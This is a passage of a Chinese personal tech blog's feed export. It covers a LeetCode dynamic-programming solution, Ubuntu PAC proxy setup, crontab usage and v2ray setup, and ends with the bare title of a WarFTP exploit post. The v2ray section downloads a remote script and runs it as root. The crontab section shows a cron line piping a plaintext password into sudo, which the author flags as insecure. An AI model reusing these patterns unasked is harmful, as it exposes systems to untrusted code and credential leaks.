lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：steps = <span class="number">4</span>, arrLen = <span class="number">2</span></span><br><span class="line">输出：<span class="number">8</span></span><br></pre></td></tr></table></figure><h3 id="约束条件：-3"><a href="#约束条件：-3" class="headerlink" title="约束条件："></a>约束条件：</h3><ul><li><code>1 &lt;= steps &lt;= 500</code></li><li><code>1 &lt;= arrLen &lt;= 10^6</code></li></ul><h3 id="解题思路：-3"><a href="#解题思路：-3" class="headerlink" title="解题思路："></a>解题思路：</h3><p>可以用动态规划，将题目分解为<code>dp(steps, current_pos)</code>，表示移动<code>steps</code>步到达当前位置<code>current_pos</code>。因此，可以得出一般情况下的转移矩阵<br><code>dp(steps, current_pos)=dp(steps-1, current_pos-1)+dp(steps-1, current_pos)+dp(step-1, current-pos+1)</code>。</p><ul><li>当<code>current_pos=0</code>时，<code>dp(steps, current_pos)=dp(steps-1, current_pos)+dp(step-1, current-pos+1)</code></li><li>当<code>current_pos=arrLen-1</code>时，<code>dp(steps, current_pos)=dp(steps-1, current_pos-1)+dp(steps-1, current_pos)</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numWays</span><span class="params">(self, steps, arrLen)</span>:</span></span><br><span class="line">        <span class="comment"># Time : 0.085m</span></span><br><span class="line">        j_max = min(steps, arrLen)</span><br><span class="line">        result_table = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(j_max)] <span class="keyword">for</span> _ <span class="keyword">in</span> range(steps+<span class="number">1</span>)] </span><br><span class="line">        result_table[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        MOD = <span class="number">10</span>**<span class="number">9</span> + <span class="number">7</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, steps+<span class="number">1</span>):</span><br><span class="line">            result_table[i][<span class="number">0</span>] = (result_table[i<span class="number">-1</span>][<span class="number">0</span>] + result_table[i<span class="number">-1</span>][<span class="number">1</span>]) % MOD</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, j_max<span class="number">-1</span>):</span><br><span class="line">                result_table[i][j] = (result_table[i<span class="number">-1</span>][j<span class="number">-1</span>] + result_table[i<span class="number">-1</span>][j] + \</span><br><span class="line">                    result_table[i<span class="number">-1</span>][j+<span class="number">1</span>]) % MOD</span><br><span class="line">            result_table[i][j_max<span class="number">-1</span>] = (result_table[i<span class="number">-1</span>][j_max<span class="number">-2</span>] + result_table[i<span class="number">-1</span>][j_max<span class="number">-1</span>]) % MOD</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> result_table[<span class="number">-1</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>因为计算结果只需要返回<code>result_table[-1][0]</code>，所以实际上表格右下角的计算是多余的。我们可以进一步对右下角进行优化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numWays</span><span class="params">(self, steps, arrLen)</span>:</span></span><br><span class="line">        j_max = min(steps, arrLen)</span><br><span class="line">        result_table = [[<span class="number">0</span>] * min(j_max, steps-i+<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(steps+<span class="number">1</span>)]</span><br><span class="line">        result_table[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        MOD = <span class="number">10</span>**<span class="number">9</span> + <span class="number">7</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># <span class="doctag">Note:</span> After optimizing the right-down space, maybe the several rows at the top have</span></span><br><span class="line">        <span class="comment"># the same length of the rows. When (steps-i+1) is smaller than j_max, </span></span><br><span class="line">        <span class="comment"># the len(dp[i]) = len(dp[i-1])-1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, steps+<span class="number">1</span>): </span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(result_table[i])):</span><br><span class="line">                <span class="keyword">if</span> j == <span class="number">0</span>:</span><br><span class="line">                    result_table[i][j] = (result_table[i<span class="number">-1</span>][<span class="number">0</span>] + result_table[i<span class="number">-1</span>][<span class="number">1</span>]) % MOD</span><br><span class="line">                <span class="keyword">elif</span> j == j_max <span class="number">-1</span>:</span><br><span class="line">                    result_table[i][j] = (result_table[i<span class="number">-1</span>][j<span class="number">-1</span>] + result_table[i<span class="number">-1</span>][j]) % MOD</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    result_table[i][j] = (result_table[i<span class="number">-1</span>][j<span class="number">-1</span>] + result_table[i<span class="number">-1</span>][j] + \</span><br><span class="line">                        result_table[i<span class="number">-1</span>][j+<span class="number">1</span>]) % MOD</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> result_table[<span class="number">-1</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ubuntu设置pac全局代理</title>
      <link href="/2019/06/02/Ubuntu%E8%AE%BE%E7%BD%AEpac%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86/"/>
      <content type="html"><![CDATA[<p>本机环境</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Distributor <span class="string">ID:</span>Ubuntu</span><br><span class="line"><span class="string">Description:</span>Ubuntu <span class="number">18.04</span><span class="number">.1</span> LTS</span><br><span class="line"><span class="string">Release:</span><span class="number">18.04</span></span><br><span class="line"><span class="string">Codename:</span>bionic</span><br></pre></td></tr></table></figure><a id="more"></a><ol><li>安装genpac</li></ol><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 <span class="keyword">install</span> genpac</span><br></pre></td></tr></table></figure><ol start="2"><li>创建目录用于存放相关文件</li></ol><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ssrPAC</span><br><span class="line"><span class="built_in">cd</span> ssrPAC</span><br><span class="line">touch user-rules.txt</span><br></pre></td></tr></table></figure><ol start="3"><li>生成pac文件</li></ol><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genpac -p <span class="string">"SOCKS5 127.0.0.1:1080"</span> <span class="params">--gfwlist-proxy=</span><span class="string">"SOCKS5 127.0.0.1:1080"</span> <span class="params">--output=</span><span class="string">"autoproxy.pac"</span> <span class="params">--gfwlist-url=</span><span class="string">"https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt"</span> <span class="params">--user-rule-from=</span><span class="string">"user-rules.txt"</span></span><br></pre></td></tr></table></figure><ol start="4"><li>设置全局代理<br>打开System setting &gt; Network &gt; Network Proxy<br>将Method改为<strong>Automatic</strong><br>并在Configuration URL填入以下内容：</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="regexp">//</span><span class="regexp">/home/</span>roger-hwong<span class="regexp">/software/</span>ssrPAC<span class="regexp">/autoproxy.pac</span></span><br></pre></td></tr></table></figure><p>即“file://” + autoproxy.pac文件的绝对路径</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/hanshileiai/article/details/52624303" target="_blank" rel="noopener">ubuntu基于shadowsocks的PAC全局代理：解决方案</a></p>]]></content>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ubuntu的计划任务</title>
      <link href="/2019/06/02/Ubuntu%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/"/>
      <content type="html"><![CDATA[<p>因为最近倒腾着Ubuntu，但是想着每天都要执行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">update</span></span><br><span class="line">sudo apt <span class="keyword">upgrade</span></span><br></pre></td></tr></table></figure><p>来更新自己的软件，就有点烦。而且经常忘记。所以这个时候就发现了Crontab这种好用的软件。（<strong>懒癌患者救星</strong>）</p><a id="more"></a><hr><h2 id="crontab相关文件的位置"><a href="#crontab相关文件的位置" class="headerlink" title="crontab相关文件的位置"></a>crontab相关文件的位置</h2><ul><li><code>/var/spool/cron/crontabs</code>：存放着每个用户的crontab任务，各个文件以用户名命名。</li><li><code>/etc</code>：存放着不同重复时间的计划任务的目录（如<code>cron.daily</code>,<code>cron.weekly</code>，每个目录下存放要执行的crontab文件或者脚本。</li></ul><h2 id="crontab基本命令"><a href="#crontab基本命令" class="headerlink" title="crontab基本命令"></a>crontab基本命令</h2><ul><li><code>crontab -e</code>：编辑当前用户的crontab任务，当该用户不存在crontab任务时新建一个文件</li><li><code>crontab -l</code>：列出当前用户的crontab任务。</li><li><code>crontab -r</code>：删除当前用户的crontab任务文件。</li><li><code>crontab -u &lt;user&gt;</code>：指定某一用户的crontab任务文件。</li></ul><h2 id="新建自己的计划任务"><a href="#新建自己的计划任务" class="headerlink" title="新建自己的计划任务"></a>新建自己的计划任务</h2><p>我想着怎么新建一个自动执行<code>sudo apt update</code>的任务</p><p>开始踩坑填坑之路。。</p><p>第一步，新建自己的任务文件。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">crontab -e</span></span><br></pre></td></tr></table></figure><p>一开始会让你选择编辑器，我选了nano，因为它提示最简单:)</p><p>然后看着这个文件，有点头大，然后去找谷歌问了一下。</p><p>一条具体任务的格式是这样的：</p><p><strong>分钟 小时 日期 月份 周几 命令</strong></p><table><thead><tr><th>字段</th><th>描述</th><th>允许的值</th></tr></thead><tbody><tr><td>分钟</td><td>一小时内的第几分</td><td>0-59</td></tr><tr><td>小时</td><td>一天里的第几个小时</td><td>0-23</td></tr><tr><td>日期</td><td>一个月的第几天</td><td>1-31</td></tr><tr><td>月份</td><td>一年的第几个月</td><td>1-12</td></tr><tr><td>周几</td><td>一周的第几天</td><td>0-7（0和7都是星期天）</td></tr><tr><td>命令</td><td>命令</td><td>任何可以被执行的命令</td></tr></tbody></table><p>举一个例子：我想在每天早上10点钟的和晚上10点钟的时候执行<code>update</code>和<code>upgrade</code>命令</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span><span class="number">10</span>,<span class="number">22</span> * * * sudo apt update</span><br><span class="line"><span class="symbol">1 </span><span class="number">10</span>,<span class="number">22</span> * * * sudo apt upgrade</span><br></pre></td></tr></table></figure><p>其中每个字段用<strong>空格</strong>隔开，然后为了两个命令的先后顺序，一个设置了0分的时候，一个设置了1分的时候。</p><p>用<strong>逗号</strong>隔开的时间都会执行该任务，也就是10点和22点的时候，任务都会执行。</p><p>*表示每天或者每小时，每个月都会执行</p><p>现在来查看我的计划任务创建了没，用命令<code>crontab -l</code></p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">▶ crontab -l</span><br><span class="line"><span class="meta"># Edit this file to introduce tasks to be run by cron.</span></span><br><span class="line"><span class="meta"># </span></span><br><span class="line"><span class="meta"># Each task to run has to be defined through a single line</span></span><br><span class="line"><span class="meta"># indicating with different fields when the task will be run</span></span><br><span class="line"><span class="meta"># and what command to run for the task</span></span><br><span class="line"><span class="meta"># </span></span><br><span class="line"><span class="meta"># To define the time you can provide concrete values for</span></span><br><span class="line"><span class="meta"># minute (m), hour (h), day of month (dom), month (mon),</span></span><br><span class="line"><span class="meta"># and day of week (dow) or use '*' in these fields (for 'any').# </span></span><br><span class="line"><span class="meta"># Notice that tasks will be started based on the cron's system</span></span><br><span class="line"><span class="meta"># daemon's notion of time and timezones.</span></span><br><span class="line"><span class="meta"># </span></span><br><span class="line"><span class="meta"># Output of the crontab jobs (including errors) is sent through</span></span><br><span class="line"><span class="meta"># email to the user the crontab file belongs to (unless redirected).</span></span><br><span class="line"><span class="meta"># </span></span><br><span class="line"><span class="meta"># For example, you can run a backup of all your user accounts</span></span><br><span class="line"><span class="meta"># at 5 a.m every week with:</span></span><br><span class="line"><span class="meta"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span></span><br><span class="line"><span class="meta"># </span></span><br><span class="line"><span class="meta"># For more information see the manual pages of crontab(5) and cron(8)</span></span><br><span class="line"><span class="meta"># </span></span><br><span class="line"><span class="meta"># m h  dom mon dow   command</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span> <span class="number">10</span>,<span class="number">22</span> * * * sudo apt update</span><br><span class="line"><span class="number">1</span> <span class="number">10</span>,<span class="number">22</span> * * * sudo apt upgrade</span><br></pre></td></tr></table></figure><p>说明已经创建成功了，但是在实际测试后，通过查看日志的方式发现这两条任务。。。</p><h3 id="写的不对"><a href="#写的不对" class="headerlink" title="写的不对"></a>写的不对</h3><h3 id="写的不对-1"><a href="#写的不对-1" class="headerlink" title="写的不对"></a>写的不对</h3><h3 id="写的不对-2"><a href="#写的不对-2" class="headerlink" title="写的不对"></a>写的不对</h3><p><strong>因为在crontab里面直接执行sudo命令时无效的。</strong></p><h3 id="下面是强烈推荐："><a href="#下面是强烈推荐：" class="headerlink" title="下面是强烈推荐："></a>下面是强烈推荐：</h3><p>想要在crontab里面执行root权限的命令，建议在创建任务时就使用root权限，如：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo crontab -e</span></span><br></pre></td></tr></table></figure><p>将其中的任务改成：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span><span class="number">10</span>,<span class="number">22</span> * * * apt update</span><br><span class="line"><span class="symbol">1 </span><span class="number">10</span>,<span class="number">22</span> * * * apt upgrade</span><br></pre></td></tr></table></figure><p>这是安全保险的一种方法。</p><h3 id="不推荐的做法："><a href="#不推荐的做法：" class="headerlink" title="不推荐的做法："></a>不推荐的做法：</h3><p>在crontab里面执行sudo命令。</p><p>注释<code>/etc/sudoers</code>的<code>Defaults requiretty</code>这一行。</p><p>因为sudo默认需要tty终端，而crontab里的命令实际是以无tty形式执行的。</p><p>这么做，你的密码会以明文的形式存在在文件中，这将存在安全隐患。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@hourly</span> echo “password” |<span class="string"> sudo -S apt update</span></span><br></pre></td></tr></table></figure><p>这里再提一下，如何查看日志</p><p>可以直接</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>cron status</span><br></pre></td></tr></table></figure><p>查看最近的几条日志信息。</p><p>另一种方式，查看<code>/var/log/syslog</code>文件，这里面包含了系统里面的（应该是所有的）日志吧（还没研究过）</p><p>如果想只看crontab的日志，可以用一下命令</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep CRON /<span class="built_in">var</span>/<span class="built_in">log</span>/syslog</span><br></pre></td></tr></table></figure><h2 id="最后一定要记得"><a href="#最后一定要记得" class="headerlink" title="最后一定要记得"></a>最后一定要记得</h2><h2 id="一定要记得"><a href="#一定要记得" class="headerlink" title="一定要记得"></a>一定要记得</h2><h2 id="记得"><a href="#记得" class="headerlink" title="记得"></a>记得</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>cron start</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/richerg85/article/details/23442411" target="_blank" rel="noopener">Linux 计划任务之crontab</a></p><p><a href="https://blog.csdn.net/kai404/article/details/52169122" target="_blank" rel="noopener">Linux crontab下关于使用date命令和sudo命令的坑</a></p><p><a href="https://www.jianshu.com/p/838db0269fd0" target="_blank" rel="noopener">Linux之crontab定时任务</a></p><p><a href="http://blog.51cto.com/461205160/1736383" target="_blank" rel="noopener">如何查看crontab的日志记录</a></p><p><a href="https://askubuntu.com/questions/173924/how-to-run-a-cron-job-using-the-sudo-command" target="_blank" rel="noopener">How to run a cron job using the sudo command</a></p><p><a href="https://askubuntu.com/questions/56683/where-is-the-cron-crontab-log" target="_blank" rel="noopener">Where is the cron / crontab log?</a></p>]]></content>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>v2ray搭建与基础配置</title>
      <link href="/2019/06/02/v2ray%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/"/>
      <content type="html"><![CDATA[<p>以下都是我自己实验一天的过程，因为每个人的计算机环境不同，情况不同。不保证全都能正常完成配置，如遇到新的错误或者问题，请各位同学自行查询资料，发扬自主积极学习的精神，不做伸手党。</p><p>有什么问题可以找我的老板Google(如果有条件)，Baidu，还有简书，知乎等。</p><a id="more"></a><h3 id="1-下载安装官方的一键脚本"><a href="#1-下载安装官方的一键脚本" class="headerlink" title="1. 下载安装官方的一键脚本"></a>1. 下载安装官方的一键脚本</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http<span class="variable">s:</span>//install.direct/<span class="keyword">go</span>.<span class="keyword">sh</span></span><br><span class="line">sudo bash <span class="keyword">go</span>.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><h3 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2. 修改配置文件"></a>2. 修改配置文件</h3><p>这里提供两个配置文件的模板：<a href="https://github.com/ZR-Huang/v2ray-controller/tree/master/template_config?1535353696219" target="_blank" rel="noopener">下载地址</a></p><h4 id="a-上传服务器配置文件"><a href="#a-上传服务器配置文件" class="headerlink" title="a.上传服务器配置文件"></a>a.上传服务器配置文件</h4><p>先将v2ray自带的配置文件做个备份</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv /etc/v2ray/config<span class="selector-class">.json</span> /etc/v2ray/config<span class="selector-class">.json</span><span class="selector-class">.backup</span></span><br></pre></td></tr></table></figure><p>然后用任何方式<code>xftp</code>或者<code>scp</code>，把刚刚下载的<code>server_config.json</code>上传到<code>/etc/v2ray/</code>并重命名为<code>config.json</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv <span class="regexp">/etc/</span>v2ray<span class="regexp">/server_config.json /</span>etc<span class="regexp">/v2ray/</span>config.json</span><br></pre></td></tr></table></figure><h4 id="b-修改服务器配置文件"><a href="#b-修改服务器配置文件" class="headerlink" title="b.修改服务器配置文件"></a>b.修改服务器配置文件</h4><p>主要修改服务器配置文件中的<code>port</code>,<code>uuid</code></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/v2ray/<span class="built_in">config</span>.json</span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"inbound"</span>: &#123;</span><br><span class="line">    <span class="string">"port"</span>: <span class="number">11111</span>,  // 该服务运行的端口</span><br><span class="line">    <span class="string">"protocol"</span>: <span class="string">"vmess"</span>,</span><br><span class="line">    <span class="string">"settings"</span>: &#123;</span><br><span class="line">      <span class="string">"clients"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">"id"</span>: <span class="string">"UUID"</span>,  // 你本人的id，其实就是加解密用的秘钥</span><br><span class="line">          <span class="string">"level"</span>: <span class="number">1</span>,</span><br><span class="line">          <span class="string">"alterId"</span>: <span class="number">100</span>,</span><br><span class="line">          <span class="string">"security"</span>: <span class="string">"aes-128-cfb"</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>UUID可以在这个<a href="https://www.uuidgenerator.net/" target="_blank" rel="noopener">网站</a>生成<br>将里面UUID改成自己的。端口看自己心情设置。</p><h3 id="3-客户端配置"><a href="#3-客户端配置" class="headerlink" title="3. 客户端配置"></a>3. 客户端配置</h3><h4 id="a-Linux"><a href="#a-Linux" class="headerlink" title="a. Linux"></a>a. Linux</h4><p>先下载<code>v2ray-core</code> (<a href="https://github.com/v2ray/v2ray-core/releases" target="_blank" rel="noopener">下载地址</a>)，下载自己对应的版本，（我用Ubuntu18.04，下的<code>v2ray-linux-64.zip</code>)</p><p>压缩包解压后，同样也是先将默认的配置文件进行备份。(以下操作均在解压后的v2ray的那个目录下执行）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv config<span class="selector-class">.json</span> config<span class="selector-class">.json</span><span class="selector-class">.backup</span></span><br></pre></td></tr></table></figure><p>同样也是将之前我提供的客户端配置文件(<code>client_config.json</code>）下载后，放在这个目录下，并重命名为<code>config.json</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mv</span> <span class="selector-tag">client_config</span><span class="selector-class">.json</span> <span class="selector-tag">config</span><span class="selector-class">.json</span></span><br></pre></td></tr></table></figure><p>接下来修改对应的配置</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"outbound"</span>: &#123;</span><br><span class="line">      <span class="string">"protocol"</span>: <span class="string">"vmess"</span>,</span><br><span class="line">      <span class="string">"settings"</span>: &#123;</span><br><span class="line">        <span class="string">"vnext"</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">"address"</span>: <span class="string">"your ip or domain"</span>, // 修改为你的服务器ip或者域名</span><br><span class="line">            <span class="string">"port"</span>: <span class="number">12345</span>, // 修改为你之前服务器设置的端口</span><br><span class="line">            <span class="string">"users"</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="string">"id"</span>: <span class="string">"UUID"</span>,  // 与你服务器上的id保持一致</span><br><span class="line">                <span class="string">"alterId"</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="string">"security"</span>: <span class="string">"aes-128-cfb"</span></span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>后台运行<code>v2ray</code></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup <span class="string">./v2ray</span> <span class="params">--config=</span><span class="string">./config.json</span> &amp;</span><br></pre></td></tr></table></figure><h4 id="b-Windows"><a href="#b-Windows" class="headerlink" title="b. Windows"></a>b. Windows</h4><p>说实话，还没实验，因为平时不用Windows。不过附上官方推荐的Windows的客户端<a href="https://www.v2ray.com/ui_client/windows.html" target="_blank" rel="noopener">列表</a></p><p>可以直接下载<a href="https://github.com/2dust/v2rayN/releases" target="_blank" rel="noopener">V2RayN</a>的可执行文件，因为看大家好像都用这个。下载完之后好像免安装的，配置可能也就是改个<code>ip</code>，<code>port</code>，<code>uuid</code>，<code>alterid</code>之类的，都和服务器保持一致就可以了。</p><h4 id="c-Mac-OS-X"><a href="#c-Mac-OS-X" class="headerlink" title="c. Mac OS X"></a>c. Mac OS X</h4><h2 id="对不起，买不起。"><a href="#对不起，买不起。" class="headerlink" title="对不起，买不起。"></a>对不起，买不起。</h2><h4 id="d-FINALLY，配置浏览器或者系统全局代理"><a href="#d-FINALLY，配置浏览器或者系统全局代理" class="headerlink" title="d. FINALLY，配置浏览器或者系统全局代理"></a>d. FINALLY，配置浏览器或者系统全局代理</h4><p>（<strong>这部分不多阐述了，网络上较多教程</strong>)<br>在浏览器也需要个扩展插件配合。</p><ol><li>Chrome的扩展<a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?utm_source=chrome-ntp-icon" target="_blank" rel="noopener">Omega</a>（<strong>下这个扩展需要翻墙，建议可以去网上搜一下安装包</strong>)。这里有篇教程简单提了一下Switchyomega的使用（<a href="https://www.hinwen.com/31890.html" target="_blank" rel="noopener">小众科学上网-V2Ray搭建及使用教程</a>）在文章<strong>较后</strong>部分需要翻一翻。</li><li>Firefox的<a href="https://addons.mozilla.org/zh-CN/firefox/addon/switchyomega" target="_blank" rel="noopener">Proxy SwitchyOmega </a>。</li></ol><p><a href="https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt" target="_blank" rel="noopener">GFWList</a> 是一个有用的东西，可以帮助代理仅仅被屏蔽的内容，我们可以结合<a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?utm_source=chrome-ntp-icon" target="_blank" rel="noopener">Omega</a> 和 <a href="https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt" target="_blank" rel="noopener">GFWList</a> 来配置自动代理，甚至可以使用 <a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?utm_source=chrome-ntp-icon" target="_blank" rel="noopener">Omega</a> 生成 PAC 文件来设定系统级别的自动代理。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://toutyrater.github.io/" target="_blank" rel="noopener">V2ray白话文教程</a><br><a href="https://www.v2ray.com/" target="_blank" rel="noopener">V2ray官方手册</a><br><a href="https://www.hinwen.com/31890.html" target="_blank" rel="noopener">小众科学上网-V2Ray搭建及使用教程</a><br><a href="https://yuan.ga/v2ray-complete-tutorial/" target="_blank" rel="noopener">V2Ray完全使用教程</a><br><a href="https://www.ivyseeds.cf/v2ray/" target="_blank" rel="noopener">从零开始部署FanWa11梯子指南（六）Fanwa11新神器，V2Ray初探</a></p>]]></content>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> breakwall </tag>
            
            <tag> v2ray </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>warftp漏洞利用实验</title>
      <link href="/2019/04/24/warftp%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/"/>
